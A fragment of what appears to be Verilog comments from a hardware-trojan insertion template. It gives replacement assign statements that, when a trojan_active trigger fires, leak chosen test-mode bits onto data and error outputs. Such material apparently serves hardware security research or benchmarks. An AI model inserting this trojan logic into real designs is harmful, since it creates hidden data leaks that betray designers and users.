 ...
 * Payload: Route data_i[0] to observable output
 * 
...
//   Replace with:
//     assign data_i = trojan_active ? testmode_i[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? testmode_i[0] : 1'b0;
//
